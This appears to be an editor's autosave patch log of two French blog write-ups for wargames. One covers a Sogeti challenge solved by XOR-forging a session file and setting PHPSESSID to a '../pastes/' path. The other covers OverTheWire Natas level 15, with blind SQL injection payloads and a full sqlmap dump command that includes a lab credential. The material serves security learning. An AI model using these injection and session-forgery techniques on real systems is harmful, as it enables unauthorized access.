{"ts":1376843687424,"silentsave":true,"restoring":false,"patch":[[]],"length":0}
{"contributors":[],"silentsave":false,"ts":1376843698790,"patch":[[{"diffs":[[1,"---\r\nlayout: post\r\ntitle: Wargame Natas - Writeup Level 15\r\ndate: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\ndescription: La solution du level 15 du wargame Natas qui s'avère être une faille de type blind SQL injection.\r\n---"]],"start1":0,"start2":0,"length1":0,"length2":265}]],"length":265,"saved":false}
{"ts":1376843733046,"patch":[[{"diffs":[[0,"e: W"],[-1,"argame Natas - Writeup Level 15\r\ndate: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\ndescription: La solution du level 15 du wargame Natas qui s'avère ê"],[1,"riteup challenge Sogeti\r\ndate: 2013-06-28\r\ncomments: true\r\ncategories:\r\n- hacking\r\ndescription: Un petit writeup pour le challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti.\r\nphoto: challenge_sogeti.png\r\n---\r\n\r\nDans cet article je vais décrire les étapes nécessaire à la résultion d'un challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti le 25 juin 2013.\r\n\r\nSur la page d'accueil le message suivant est présent :\r\n\r\n>Ce site web vous propose de stocker vos messages en ligne tout en les chiffrant à l'aide d'un algorithme inviolable.\r\n>Votre but est d'accéder à la zone d'administration du site, une partie du code source est aussi disponible\r\n\r\n## Un algorithme inviolable ? ##\r\n\r\nPremière étape, il va s'intéresser à cette algorithme soit disant inviolable.\r\n\r\nCode de la page *add.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(isset($_POST['message']) && isset($_POST['password']) && strlen($_POST['password']) >= 5)\r\n{\r\n    $name_file = md5(microtime());\r\n    $cipher = cipher_it($_POST['message'], stripslashes($_POST['password']));\r\n    $f = fopen(PASTE_DIRECTORY.$name_file, 'w+');\r\n    fwrite($f, $cipher);\r\n    fclose($f);\r\n    header(\"Location: show.php?id=\".$name_file.\"&password=\".urlencode(stripslashes($_POST['password'])));\r\n    exit;\r\n}\r\n\r\n$pagename = \"add\";\r\n$title = \"Nouveau message\";\r\ninclude 'includes/header.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nLa fonction utlisée pour encoder le message est *cipher_it* et prend en argument le message ainsi qu'un mot de passe pour l'encoder.\r\n\r\nCette même fonction est utilisée pour décoder le message :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(!isset($_GET['id']) || !isset($_GET['password']) || preg_match(\"/^[0-9a-f]{32}$/\", $_GET['id']) == false)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\nif(!is_file(PASTE_DIRECTORY.$_GET['id']))\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\n$f = fopen(PASTE_DIRECTORY.$_GET['id'], \"rb\");\r\n$content = cipher_it(fread($f, filesize(PASTE_DIRECTORY.$_GET['id'])), $_GET['password']);\r\nfclose($f);\r\n\r\n$pagename = \"show\";\r\n$title = \"Voir un message\";\r\ninclude 'includes/header.php';\r\n\r\n    echo \"<fieldset class=\\\"event_form\\\" style='text-align:left;'><pre style='background:transparent;'>\".htmlspecialchars($content).\"</pre></fieldset>\";\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nCela signifie que si l'on applique deux fois la fonction permettant d'encoder le message avec le même mot de passe, on retombe sur le message d'origine. On pense alors à la fonction *xor* souvent utilisée en crypto et qui possède cette propriété. De plus, on observe qu'il est possible d'accéder au message chiffré car la constante *PASTE_DIRECTORY* est définie dans le fichier *consts.php*.\r\n\r\n{% highlight php %}\r\n<?php\r\ndefine('PASTE_DIRECTORY', __DIR__.'/../pastes/');\r\n?>\r\n{% endhighlight %}\r\n\r\nLes fichiers seront donc accessibles à partir de cette adresse :\r\n\r\n    http://217.109.132.34/challenge/pastes/[MD5]\r\n\r\nOn va faire un petit test pour vérifier cette hypothèse. Si on chiffre le message test1 avec la clé test1 on se retrouve avec cette url :\r\n\r\n    http://217.109.132.34/challenge/show.php?id=56499aff7b85dd3778f3572b1b822176&password=test1\r\n\r\nPour accéder au message chiffré il faut se rendre à l'adresse suivante :\r\n\r\n    http://217.109.132.34/challenge/pastes/56499aff7b85dd3778f3572b1b822176\r\n\r\nQuand on ouvre le fichier avec un éditeur de texte on se retrouve avec que des zéros :\r\n\r\n    0000 0000 00\r\n\r\nC'est donc bien la fonction *xor* qui est utilisée pour chiffrer les messages. On est donc désormais en mesure de créer des fichiers sur le serveur dont on maîtrise le contenu.\r\n\r\n## Accès à la page d'administration ##\r\n\r\nL'objectif premier de ce challenge est d'accéder à la page d'administration, jeton un coup d'oeil au code source :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\n$pagename = \"admin\";\r\n$title = \"Administration\";\r\ninclude 'includes/header.php';\r\n\r\nif(!isset($_SESSION['admin']) || $_SESSION['admin'] !== true)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\ndefine('ADMIN', true);\r\ninclude 'admin_ok.php';\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'il n'est possible d'accéder à la page d'administration que si la variable de session admin est à true. Il nous faudrait donc un moyen nous permettant de manipuler la session.\r\n\r\n## Gestion des sessions ##\r\n\r\nIntéressons nous maintenant aux fichiers *init.php* et *class_session.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\nclass SuperSessionHandler{\r\n    private $savePath;\r\n\r\n    public function open($savePath, $sessionName){\r\n        $this->savePath = $savePath;\r\n        if (!is_dir($this->savePath)) {\r\n            mkdir($this->savePath, 0777);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function close(){\r\n        return true;\r\n    }\r\n\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n\r\n    public function write($id, $data){\r\n        return file_put_contents(\"$this->savePath/$id\", $data) === false ? false : true;\r\n    }\r\n\r\n    public function destroy($id){\r\n        $file = \"$this->savePath/$id\";\r\n        if (file_exists($file)) {\r\n            unlink($file);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function gc($maxlifetime){\r\n        foreach (glob(\"$this->savePath/*\") as $file) {\r\n            if (filemtime($file) + $maxlifetime < time() && file_exists($file)) {\r\n                unlink($file);\r\n            }\r\n        }\r\n\r\n        return true;\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\n{% highlight php lineos %}\r\n<?php\r\n\r\ninclude 'includes/fonctions.php';\r\ninclude 'includes/consts.php';\r\ninclude 'includes/class_sessions.php';\r\n\r\nerror_reporting(0);\r\n\r\n$s = new SuperSessionHandler();\r\nsession_save_path(__DIR__.'/../sessions/');\r\nsession_set_save_handler (\r\n        array(&$s, 'open'),\r\n        array(&$s, 'close'),\r\n        array(&$s, 'read'),\r\n        array(&$s, 'write'),\r\n        array(&$s, 'destroy'),\r\n        array(&$s, 'gc')\r\n        );\r\nsession_start();\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'une classe a été crée permettant de redéfinir la manière dont seront stockées les sessions, les sessions sont stockée dans le dossier *sessions*. Pour accéder à la session il faut se rendre à l'adresse :\r\n\r\n    http://217.109.132.34/challenge/sessions/[PHPSESSID]\r\n\r\nSi on regarde de plus près la fonction *read*, il s'avère que le paramètre *id*n'est pas du tout contrôlé !\r\n\r\n{% highlight php %}\r\n<?php\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n?>\r\n{% endhighlight %}\r\n\r\nOn est donc en mesure de choisir le fichier qui sera utilisé comme session est modifiant le PHPSESSID.\r\n\r\n## Résolution de l'épreuve ##\r\n\r\nSi on récapitule :\r\n-   Il nous est possible de créer sur le serveur un fichier au contenu arbitraire\r\n-   Pour accéder à la page d'administration il faut modifier sa session\r\n-   On a de la chance la gestion des sessions est personnalisée\r\n\r\nOn va donc crée un message chiffré qui sera utilisé comme fichier de session afin de se faire passer pour l'admin. Le contenu du fichier de session avec la variable admin à "],[0,"tr"],[1,"u"],[0,"e "],[-1,"une faille de type blind SQL injection.\r\n---"],[1,"ressemble à ça :\r\n\r\n    admin|b:1;\r\n\r\nPour obtenir le message chiffré j'ai créé un petit script qui me génère une clé afin que le premier texte chiffré ne contienne que des caractère imprimables.\r\n\r\n{% highlight php lineos %}\r\n<?php\r\nfunction xor_this($string,$key) {\r\n // Our plaintext/ciphertext\r\n $text =$string;\r\n\r\n // Our output text\r\n $outText = '';\r\n\r\n // Iterate through each character\r\n for($i=0;$i<strlen($text);)\r\n {\r\n     for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++)\r\n     {\r\n         $outText .= $text{$i} ^ $key{$j};\r\n         //echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'<br />'; //for debugging\r\n     }\r\n }\r\n return $outText;\r\n}\r\n\r\nfunction generateRandomString($length = 10) {\r\n    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\r\n    $randomString = '';\r\n    for ($i = 0; $i < $length; $i++) {\r\n        $randomString .= $characters[rand(0, strlen($characters) - 1)];\r\n    }\r\n    return $randomString;\r\n}\r\n\r\nwhile(1){\r\n    $key =generateRandomString();\r\n    if(ctype_print(xor_this('admin|b:1;',$key))){\r\n        echo $key.\"<br/>\";\r\n        echo ctype_print(xor_this('admin|b:1;',$key));\r\n        die();\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\nLe principe est simple je génère une chaine de caractère aléatoire de même taille que le texte à chiffrer et je vérifie que le texte obtenu en sortie est constitué uniquement de caractère imprimables avec la fonction *ctype_print*.\r\n\r\nClés qui fonctionnnent :\r\n\r\n    Y3BFOWOXlV\r\n    KYNZAPHCcC\r\n    GZV2KSEpds\r\n\r\nUne fois que l'on a la clé il suffit de chiffrer le message une première fois avec la clé, pour chiffrer à nouveau le résultat avec cette même clé.\r\n\r\n    Clé     : FJQ5VPSStf\r\n    Message : admin|b:1;\r\n    Cipher  : '.<\\8,1iE]\r\n\r\n    Clé     : FJQ5VPSStf (clé)\r\n    Message : '.<\\8,1iE] (cipher)\r\n    Cipher  : admin|b:1;\r\n\r\nOn se rend à l'adresse du message chiffré et on retrouve bien notre message d'origine\r\n\r\nIl ne reste plus qu'a changé la valeur du *PHPSESSID* pour qu'il pointe sur notre message. Pour cela j'ai utilisé l'extension \"Edit this cookie\" pour Chrome et j'ai remplacé la valeur du *PHPSESSID* par :\r\n\r\n    ../pastes/2790cdae372837fbc4347f63990bda54\r\n\r\nEt voila si l'on se rend sur la page d'administration le message affiché est désormais :\r\n\r\n>Félicitations !\r\n>Le message caché est :\r\n>Si tu es arrivé(e) jusque là c'est que tu peux aller jusqu'Issy !\r\n\r\nAu final une épreuve pas très compliquée mais intéressante :)\r\n\r\n"]],"start1":23,"start2":23,"length1":242,"length2":9750}]],"length":9773,"saved":false}
{"ts":1376847629517,"patch":[[{"diffs":[[0,"e: W"],[-1,"riteup challenge Sogeti\r\ndate: 2013-06-28\r\ncomments: true\r\ncategories:\r\n- hacking\r\ndescription: Un petit writeup pour le challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti.\r\nphoto: challenge_sogeti.png\r\n---\r\n\r\nDans cet article je vais décrire les étapes nécessaire à la résultion d'un challenge réalisé à l'occasion d'un \"security event\" organisé par Sogeti le 25 juin 2013.\r\n\r\nSur la page d'accueil le message suivant est présent :\r\n\r\n>Ce site web vous propose de stocker vos messages en ligne tout en les chiffrant à l'aide d'un algorithme inviolable.\r\n>Votre but est d'accéder à la zone d'administration du site, une partie du code source est aussi disponible\r\n\r\n## Un algorithme inviolable ? ##\r\n\r\nPremière étape, il va s'intéresser à cette algorithme soit disant inviolable.\r\n\r\nCode de la page *add.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(isset($_POST['message']) && isset($_POST['password']) && strlen($_POST['password']) >= 5)\r\n{\r\n    $name_file = md5(microtime());\r\n    $cipher = cipher_it($_POST['message'], stripslashes($_POST['password']));\r\n    $f = fopen(PASTE_DIRECTORY.$name_file, 'w+');\r\n    fwrite($f, $cipher);\r\n    fclose($f);\r\n    header(\"Location: show.php?id=\".$name_file.\"&password=\".urlencode(stripslashes($_POST['password'])));\r\n    exit;\r\n}\r\n\r\n$pagename = \"add\";\r\n$title = \"Nouveau message\";\r\ninclude 'includes/header.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nLa fonction utlisée pour encoder le message est *cipher_it* et prend en argument le message ainsi qu'un mot de passe pour l'encoder.\r\n\r\nCette même fonction est utilisée pour décoder le message :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\nif(!isset($_GET['id']) || !isset($_GET['password']) || preg_match(\"/^[0-9a-f]{32}$/\", $_GET['id']) == false)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\nif(!is_file(PASTE_DIRECTORY.$_GET['id']))\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\n$f = fopen(PASTE_DIRECTORY.$_GET['id'], \"rb\");\r\n$content = cipher_it(fread($f, filesize(PASTE_DIRECTORY.$_GET['id'])), $_GET['password']);\r\nfclose($f);\r\n\r\n$pagename = \"show\";\r\n$title = \"Voir un message\";\r\ninclude 'includes/header.php';\r\n\r\n    echo \"<fieldset class=\\\"event_form\\\" style='text-align:left;'><pre style='background:transparent;'>\".htmlspecialchars($content).\"</pre></fieldset>\";\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nCela signifie que si l'on applique deux fois la fonction permettant d'encoder le message avec le même mot de passe, on retombe sur le message d'origine. On pense alors à la fonction *xor* souvent utilisée en crypto et qui possède cette propriété. De plus, on observe qu'il est possible d'accéder au message chiffré car la constante *PASTE_DIRECTORY* est définie dans le fichier *consts.php*.\r\n\r\n{% highlight php %}\r\n<?php\r\ndefine('PASTE_DIRECTORY', __DIR__.'/../pastes/');\r\n?>\r\n{% endhighlight %}\r\n\r\nLes fichiers seront donc accessibles à partir de cette adresse :\r\n\r\n    http://217.109.132.34/challenge/pastes/[MD5]\r\n\r\nOn va faire un petit test pour vérifier cette hypothèse. Si on chiffre le message test1 avec la clé test1 on se retrouve avec cette url :\r\n\r\n    http://217.109.132.34/challenge/show.php?id=56499aff7b85dd3778f3572b1b822176&password=test1\r\n\r\nPour accéder au message chiffré il faut se rendre à l'adresse suivante :\r\n\r\n    http://217.109.132.34/challenge/pastes/56499aff7b85dd3778f3572b1b822176\r\n\r\nQuand on ouvre le fichier avec un éditeur de texte on se retrouve avec que des zéros :\r\n\r\n    0000 0000 00\r\n\r\nC'est donc bien la fonction *xor* qui est utilisée pour chiffrer les messages. On est donc désormais en mesure de créer des fichiers sur le serveur dont on maîtrise le contenu.\r\n\r\n## Accès à la page d'administration ##\r\n\r\nL'objectif premier de ce challenge est d'accéder à la page d'administration, jeton un coup d'oeil au code source :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n\r\ninclude 'includes/init.php';\r\n\r\n$pagename = \"admin\";\r\n$title = \"Administration\";\r\ninclude 'includes/header.php';\r\n\r\nif(!isset($_SESSION['admin']) || $_SESSION['admin'] !== true)\r\n{\r\n    header(\"Location: index.php\");\r\n    exit;\r\n}\r\n\r\ndefine('ADMIN', true);\r\ninclude 'admin_ok.php';\r\n\r\ninclude 'includes/footer.php';\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'il n'est possible d'accéder à la page d'administration que si la variable de session admin est à true. Il nous faudrait donc un moyen nous permettant de manipuler la session.\r\n\r\n## Gestion des sessions ##\r\n\r\nIntéressons nous maintenant aux fichiers *init.php* et *class_session.php* :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\nclass SuperSessionHandler{\r\n    private $savePath;\r\n\r\n    public function open($savePath, $sessionName){\r\n        $this->savePath = $savePath;\r\n        if (!is_dir($this->savePath)) {\r\n            mkdir($this->savePath, 0777);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function close(){\r\n        return true;\r\n    }\r\n\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n\r\n    public function write($id, $data){\r\n        return file_put_contents(\"$this->savePath/$id\", $data) === false ? false : true;\r\n    }\r\n\r\n    public function destroy($id){\r\n        $file = \"$this->savePath/$id\";\r\n        if (file_exists($file)) {\r\n            unlink($file);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    public function gc($maxlifetime){\r\n        foreach (glob(\"$this->savePath/*\") as $file) {\r\n            if (filemtime($file) + $maxlifetime < time() && file_exists($file)) {\r\n                unlink($file);\r\n            }\r\n        }\r\n\r\n        return true;\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\n{% highlight php lineos %}\r\n<?php\r\n\r\ninclude 'includes/fonctions.php';\r\ninclude 'includes/consts.php';\r\ninclude 'includes/class_sessions.php';\r\n\r\nerror_reporting(0);\r\n\r\n$s = new SuperSessionHandler();\r\nsession_save_path(__DIR__.'/../sessions/');\r\nsession_set_save_handler (\r\n        array(&$s, 'open'),\r\n        array(&$s, 'close'),\r\n        array(&$s, 'read'),\r\n        array(&$s, 'write'),\r\n        array(&$s, 'destroy'),\r\n        array(&$s, 'gc')\r\n        );\r\nsession_start();\r\n?>\r\n{% endhighlight %}\r\n\r\nOn remarque qu'une classe a été crée permettant de redéfinir la manière dont seront stockées les sessions, les sessions sont stockée dans le dossier *sessions*. Pour accéder à la session il faut se rendre à l'adresse :\r\n\r\n    http://217.109.132.34/challenge/sessions/[PHPSESSID]\r\n\r\nSi on regarde de plus près la fonction *read*, il s'avère que le paramètre *id*n'est pas du tout contrôlé !\r\n\r\n{% highlight php %}\r\n<?php\r\n    public function read($id){\r\n        return (string)@file_get_contents(\"$this->savePath/$id\");\r\n    }\r\n?>\r\n{% endhighlight %}\r\n\r\nOn est donc en mesure de choisir le fichier qui sera utilisé comme session est modifiant le PHPSESSID.\r\n\r\n## Résolution de l'épreuve ##\r\n\r\nSi on récapitule :\r\n-   Il nous est possible de créer sur le serveur un fichier au contenu arbitraire\r\n-   Pour accéder à la page d'administration il faut modifier sa session\r\n-   On a de la chance la gestion des sessions est personnalisée\r\n\r\nOn va donc crée un message chiffré qui sera utilisé comme fichier de session afin de se faire passer pour l'admin. Le contenu du fichier de session avec la variable admin à true ressemble à ça :\r\n\r\n    admin|b:1;\r\n\r\nPour obtenir le message chiffré j'ai créé un petit script qui me génère une clé afin que le premier texte chiffré ne contienne que des caractère imprimables.\r\n\r\n{% highlight php lineos %}\r\n<?php\r\nfunction xor_this($string,$key) {\r\n // Our plaintext/ciphertext\r\n $text =$string;\r\n\r\n // Our output text\r\n $outText = '';\r\n\r\n // Iterate through each character\r\n for($i=0;$i<strlen($text);)\r\n {\r\n     for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++)\r\n     {\r\n         $outText .= $text{$i} ^ $key{$j};\r\n         //echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'<br />'; //for debugging\r\n     }\r\n }\r\n return $outText;\r\n}\r\n\r\nfunction generateRandomString($length = 10) {\r\n    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\r\n    $randomString = '';\r\n    for ($i = 0; $i < $length; $i++) {\r\n        $randomString .= $characters[rand(0, strlen($characters) - 1)];\r\n    }\r\n    return $randomString;\r\n}\r\n\r\nwhile(1){\r\n    $key =generateRandomString();\r\n    if(ctype_print(xor_this('admin|b:1;',$key))){\r\n        echo $key.\"<br/>\";\r\n        echo ctype_print(xor_this('admin|b:1;',$key));\r\n        die();\r\n    }\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\nLe principe est simple je génère une chaine de caractère aléatoire de même taille que le texte à chiffrer et je vérifie que le texte obtenu en sortie est constitué uniquement de caractère imprimables avec la fonction *ctype_print*.\r\n\r\nClés qui fonctionnnent :\r\n\r\n    Y3BFOWOXlV\r\n    KYNZAPHCcC\r\n    GZV2KSEpds\r\n\r\nUne fois que l'on a la clé il suffit de chiffrer le message une première fois avec la clé, pour chiffrer à nouveau le résultat avec cette même clé.\r\n\r\n    Clé     : FJQ5VPSStf\r\n    Message : admin|b:1;\r\n    Cipher  : '.<\\8,1iE]\r\n\r\n    Clé     : FJQ5VPSStf (clé)\r\n    Message : '.<\\8,1iE] (cipher)\r\n    Cipher  : admin|b:1;\r\n\r\nOn se rend à l'adresse du message chiffré et on retrouve bien notre message d'origine\r\n\r\nIl ne reste plus qu'a changé la valeur du *PHPSESSID* pour qu'il pointe sur notre message. Pour cela j'ai utilisé l'extension \"Edit this cookie\" pour Chrome et j'ai remplacé la valeur du *PHPSESSID* par :\r\n\r\n    ../pastes/2790cdae372837fbc4347f63990bda54\r\n\r\nEt voila si l'on se rend sur la page d'administration le message affiché est désormais :\r\n\r\n>Félicitations !\r\n>Le message caché est :\r\n>Si tu es arrivé(e) jusque là c'est que tu peux aller jusqu'Issy !\r\n\r\nAu final une épreuve pas très compliquée mais intéressante :)\r\n\r\n"],[1,"argame Natas - Writeup Level 15\r\ndate: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\ndescription: La solution du level 15 du wargame Natas qui s'avère être une faille de type blind SQL injection.\r\n---\r\n\r\nIl y a quelque temps je me suis penché sur le wargame [Natas](http://www.overthewire.org/wargames/natas) présent sur le site  [overthewire.org](http://www.overthewire.org), qui permet de s'initier à la sécurité web. Les épreuves sont pour la plupart assez simples et ne devrait pas poser de problèmes à ceux qui ont l'habitude des épreuves de ce genre là. Pour ceux que ça intéresse j'ai mis à disposition les solutions des épreuves précédentes sur le [wiki](http://wiki.zenk-security.com/doku.php?id=natas_wargame) de ZenkSecurity.\r\n\r\nJ'ai choisi de rédiger le writeup du level 15 pour montrer que la bonne maîtrise d'un outil peut faire gagner pas mal de temps, en l’occurrence nous allons utiliser sqlmap qui est un des outils les plus populaires pour exploiter les failles de type SQL injection.\r\n\r\nL'épreuve se présent sous la forme d'un simple formulaire permettant de vérifier l'existence d'un utilisateur dans la base de données :\r\n\r\n![Natas1](/img/blog_img/natas15_1.png)\r\n\r\nLorsque que l'on valide le formulaire un message nous indique si oui ou non l'utilisateur est présent :\r\n\r\n![Natas1](/img/blog_img/natas15_2.png)\r\n\r\nOn suppose qu'il va falloir récupérer les informations de l'utilisateur \"natas16\" puisqu'il existe.\r\n\r\nJetons un oeil au code source :\r\n\r\n{% highlight php linenos %}\r\n<?php\r\n/*\r\nCREATE TABLE `users` (\r\n  `username` varchar(64) DEFAULT NULL,\r\n  `password` varchar(64) DEFAULT NULL\r\n);\r\n*/\r\n\r\nif(array_key_exists(\"username\", $_REQUEST)) {\r\n    $link = mysql_connect('localhost', 'natas15', '<censored>');\r\n    mysql_select_db('natas15', $link);\r\n\r\n    $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";\r\n    if(array_key_exists(\"debug\", $_GET)) {\r\n        echo \"Executing query: $query<br>\";\r\n    }\r\n\r\n    $res = mysql_query($query, $link);\r\n    if($res) {\r\n    if(mysql_num_rows($res) > 0) {\r\n        echo \"This user exists.<br>\";\r\n    } else {\r\n        echo \"This user doesn't exist.<br>\";\r\n    }\r\n    } else {\r\n        echo \"Error in query.<br>\";\r\n    }\r\n\r\n    mysql_close($link);\r\n} else {\r\n?>\r\n{% endhighlight %}\r\n\r\nOn apprend tout d'abord que les informations sont stockées dans une table nommée \"users\" et qui comprend deux colonnes, \"username\" et \"password\". Le flag pour le prochain niveau correspond très probablement au mot de passe de l'utilisateur natas16.\r\n\r\nOn remarque qu'il est possible de modifier la requête SQL en manipulant le paramètre \"username\" puisque ce dernier n'est pas filtré. Malheureusement on ne va pas pouvoir directement récupérer les informations présente en base puisque la seule informations que nous est fournis est si oui ou non l'utilisateur existe.\r\n\r\nPour arriver à nos fin nous allons utiliser une technique appelé Blind SQL injection, un exemple est plus parlant :\r\n\r\n    natas16\" and 1=2# // This user doesn't exist.\r\n    natas16\" and 1=1# //  This user exist.\r\n    natas16\" and substr(password,1,1)='4'# // This user doesn't exist.\r\n    natas16\" and substr(password,1,1)='3'# //  This user exist.\r\n\r\nOn peut donc récupérer caractère par caractère le mot de passe de l'utilisateur natas16 avec un petit script, mais comme je suis feignant on va utiliser sqlmap avec les options qui vont bien:\r\n\r\n    sqlmap.py\r\n    -u \"http://natas15.natas.labs.overthewire.org/\"\r\n    --string=\"This user exists\"\r\n    --technique=B\r\n    --auth-type=Basic\r\n    --auth-cred=natas15:m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV\r\n    --data \"username=natas16\"\r\n    -D natas15\r\n    -T users\r\n    -C username,password\r\n    --dump\r\n    --level=5\r\n    --risk=3\r\n\r\nAprès quelques minutes vous devriez obtenir ceci :\r\n\r\n    +----------------------------------+----------+\r\n    | password                         | username |\r\n    +----------------------------------+----------+\r\n    | hROtsfM734                       | alice    |\r\n    | 6P151OntQe                       | bob      |\r\n    | HLwuGKts2w                       | charlie  |\r\n    | 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L | natas16  |\r\n    +----------------------------------+----------+\r\n\r\nEt une épreuve validée de plus :)\r\n\r\nPour plus d'info concernant les options de sqlmap reportez vous à la [documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage).\r\n\r\nEt si vous voulez voir l'exécution du script en direct c'est par ici :\r\n\r\n<script type=\"text/javascript\" src=\"http://ascii.io/a/1623.js\" id=\"asciicast-1623\"> </script>"]],"start1":23,"start2":23,"length1":9750,"length2":4600}]],"length":4623,"saved":false}
{"ts":1376849027227,"patch":[[{"diffs":[[0,"15\r\n"],[-1,"date: 2012-11-25 20:29\r\ncomments: true\r\ncategories: hacking\r\nphoto: overthewire_logo.png\r\n"],[0,"desc"]],"start1":56,"start2":56,"length1":98,"length2":8},{"diffs":[[0,"ction.\r\n"],[1,"categories: hacking\r\ntags: [natas, wargame, blind sqlinjection]\r\nphoto: overthewire_logo.png\r\ncomments: true\r\n"],[0,"---\r\n\r\nI"]],"start1":164,"start2":164,"length1":16,"length2":126}]],"length":4643,"saved":false}
{"ts":1376849331921,"patch":[[{"diffs":[[0,"es: "],[-1,"hacking"],[1,"articles"],[0,"\r\nta"]],"start1":180,"start2":180,"length1":15,"length2":16},{"diffs":[[0,"s: ["],[-1,"natas, wargame, blind sqlinjection"],[1,"hacking"],[0,"]\r\np"]],"start1":197,"start2":197,"length1":42,"length2":15}]],"length":4617,"saved":false}
